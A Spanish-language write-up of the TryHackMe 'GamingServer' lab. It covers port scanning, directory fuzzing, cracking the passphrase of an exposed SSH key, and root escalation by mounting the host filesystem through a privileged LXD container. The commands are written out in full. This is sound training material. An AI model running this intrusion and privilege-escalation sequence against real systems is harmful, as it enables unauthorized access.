# Máquina GamingServer

Enlace a la máquina -> [TryHackMe](https://tryhackme.com/r/room/gamingserver)

![imagen](https://github.com/user-attachments/assets/b7aad872-f5b7-4d25-9ece-12279daf2060)

- **Nombre de la Máquina:** GamingServer
- **Sistema Operativo:** Linux  
- **Dificultad:** Fácil  
- **Plataforma:** TryHackMe  
- **Dirección IP:** 10.10.234.252
- **Vulnerabilidades Explotadas:**
  - Exposición de una clave privada RSA en el directorio secret, lo que permitió el acceso al sistema a través de SSH al usuario john.
- **Escalada de Privilegios:**
  - El usuario john era miembro del grupo lxd, lo que permitió la explotación del servicio LXD. Utilizando una imagen de contenedor personalizada, se montó el sistema de archivos del host, lo que facilitó el acceso al sistema con privilegios de root.
## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general utilizando Nmap para identificar los puertos abiertos en la IP del objetivo:

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 10.10.234.252 -oN escaneo.txt
```

![imagen](https://github.com/user-attachments/assets/82419728-dc17-40b3-ad24-a426bc06d286)

El escaneo reveló que los puertos 22 (SSH) y 80 (HTTP) están abiertos. Para un análisis más profundo, realizamos un escaneo enfocado en estos puertos para identificar los servicios y versiones que se ejecutan en ellos:

```bash
sudo nmap -p 22,80 -sCV -T5 10.10.234.252 -oN targeted.txt
```

![imagen](https://github.com/user-attachments/assets/308d85c9-3e52-432f-b5de-ec7619aa95d7)

### Puerto 80 HTTP

Utilizamos `whatweb` para obtener más detalles sobre el servicio que corre en el puerto 80:

![imagen](https://github.com/user-attachments/assets/ce419440-834f-477e-993c-c06689da50af)

![imagen](https://github.com/user-attachments/assets/e34bfa99-1b01-4f8f-a089-6cee207e4f99)

La página web a primera vista no parece tener nada interesante pero si miramos el código fuente, hay un comentario nombrando a un tal **john**.

![imagen](https://github.com/user-attachments/assets/b8fff0dc-7186-49f2-a4ef-9c3f8ecf305b)

Vamos a hacer fuzzing a ver si encontramos algún directorio interesante.

```bash
feroxbuster -u "http://10.10.234.252/" -t 100 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -B -x php
```

![imagen](https://github.com/user-attachments/assets/5a35a3f0-2a5e-4b03-abc8-37881340e915)

Hemos encontrado directorios interesantes: `secret` `uploads`
Directorio uploads:

![imagen](https://github.com/user-attachments/assets/d8be1c22-a159-4b37-ada1-806e62650ece)

Directorio secret:

![imagen](https://github.com/user-attachments/assets/63c578cf-8b7c-4cd7-85d4-bfcb066f71c5)

Nos descargamos todo y revisamos uno por uno a ver lo que es cada archivo.

![imagen](https://github.com/user-attachments/assets/426d479b-2fd3-4f15-a2cd-d0a30258a9ce)

dict.lst parece ser un diccionario.

![imagen](https://github.com/user-attachments/assets/fb994ffa-82f8-40ae-a5a4-321eb89559df)

manifesto.txt es un archivo de texto que no sirve para absolutamente nada.

![imagen](https://github.com/user-attachments/assets/7493f280-dab3-4649-b3c6-6915d00e8954)

Meme.jpg: Un archivo jpg, este puede contener esteganografía; sin embargo un chequeo rápido usando strings, Exiftool y Binwalk no encontró nada. Puede que haya información oculta que podamos extraer con Steghide, pero si la hay necesitamos una Passphrase. Ejecutando Stegcracker con la lista de palabras de rockyou tampoco encontramos una Passphrase.

secretKey es una clave RSA privada.

![imagen](https://github.com/user-attachments/assets/c8802a60-d91a-46b4-b205-305aed815330)

Para utilizarla cambiaremos los permisos del archivo pero igualmente nos pide una frase como contraseña que actualmente no conocemos.

```bash
chmod 700 secretKey
ssh john@10.10.234.252 -i secretKey
```

![imagen](https://github.com/user-attachments/assets/3ee61ba6-a004-471b-9063-9cdc4d8d1e3e)

Lo que haremos será extraer el hash usando john para poder crackearlo y conseguir esa password, utilizaremos el diccionario que conseguimos haciendo fuzzing.

![imagen](https://github.com/user-attachments/assets/be887897-d580-4395-94e6-e07e97760363)

```bash
ssh2john secretKey > john.hash
john --wordlist=dict.lst secretKey
```

![imagen](https://github.com/user-attachments/assets/824ed815-7151-4c29-aae4-a552465f5687)

### Intrusión

![imagen](https://github.com/user-attachments/assets/01480883-8731-4b01-b379-b1de6076ea6f)

## Escalada de privilegios a root
Una vez dentro intento hacer un `sudo -l` pero no tengo la password de john así que no puedo ver los permisos.

![imagen](https://github.com/user-attachments/assets/bb21c689-da79-4c11-a348-8607d13928df)

También miro los permisos SUID pero no encuentro nada interesante.

```bash
find / -perm -4000 2>/dev/null
```

Transferí un script llamdo [pspy64](https://github.com/DominicBreuker/pspy) para ver los procesos que se ejecutan en segundo plano.

![imagen](https://github.com/user-attachments/assets/263ca740-c727-472d-ad61-651b2ed74a0d)

Pero tampoco ví que se ejecutase algo interesante así que opté por ver en los grupos en los que john está y vemos que estamos en el grupo `lxd`.

![imagen](https://github.com/user-attachments/assets/e5234b9b-6dcd-4b89-8ae9-2f76e8b1a64b)

Podriamos escalar privilegios de la siguiente [manera](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation).

```bash
git clone https://github.com/saghul/lxd-alpine-builder
```

cd en el directorio "lxd-alpine-builder" y ejecute el "build-alpine" con el siguiente comando.

```bash
sudo ./build-alpine -a i686
```

Cuando hagas ls en el directorio verás que tienes el archivo de imagen con la extensión .gz. A continuación tenemos que configurar un servidor http simple y subir el archivo de imagen a la máquina remota.

![imagen](https://github.com/user-attachments/assets/cf54867b-6baf-4af5-9705-887325966d03)

Una vez cargada, tenemos que importar la imagen a lxd.

```bash
lxc image import alpine-v3.20-i686-20240911_1726.tar.gz --alias alpine
```

![imagen](https://github.com/user-attachments/assets/eca5fa89-dc44-4ac0-bd08-012fb424b1e7)

Si utilizamos el comando "lxc image list", podemos ver que la imagen ya está disponible en lxd:

![imagen](https://github.com/user-attachments/assets/af40b360-6c00-4ba2-96db-c9cfc1e86012)

Ahora necesitamos crear una máquina a partir de la imagen, esto se puede hacer ejecutando el siguiente comando:

```bash
lxc init alpine privesc -c security.privileged=true
```

Si utilizamos el comando "lxc list", ahora podemos ver que la máquina con el nombre privesc.

![imagen](https://github.com/user-attachments/assets/bd4bbed8-26f8-469f-b4b7-37d64b171d17)

A continuación necesitamos añadir un disco duro a la máquina, la técnica privesc en este caso busca tener todo el host montado en el /mnt/root y así tener acceso root. Esto lo podemos lograr con el siguiente comando:

```bash
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

![imagen](https://github.com/user-attachments/assets/40eb6891-6940-4edd-8721-7faca17e3295)

Como se ha indicado anteriormente, la máquina privesc está actualmente parada, por lo que tendremos que iniciarla con el siguiente comando:

```bash
lxc start privesc
```

![imagen](https://github.com/user-attachments/assets/a587f9e8-1723-4d72-afe0-90586783c6dc)

Para explotar la máquina, ejecutamos el siguiente comando:

```bash
lxc exec privesc /bin/sh
```

![imagen](https://github.com/user-attachments/assets/352955c8-4ca9-4418-8b87-f415e025b438)

Todo lo que tenemos que hacer ahora es coger la flag root.txt y ya está:

![imagen](https://github.com/user-attachments/assets/73d90830-a47e-4c9c-a994-88e678da45c1)
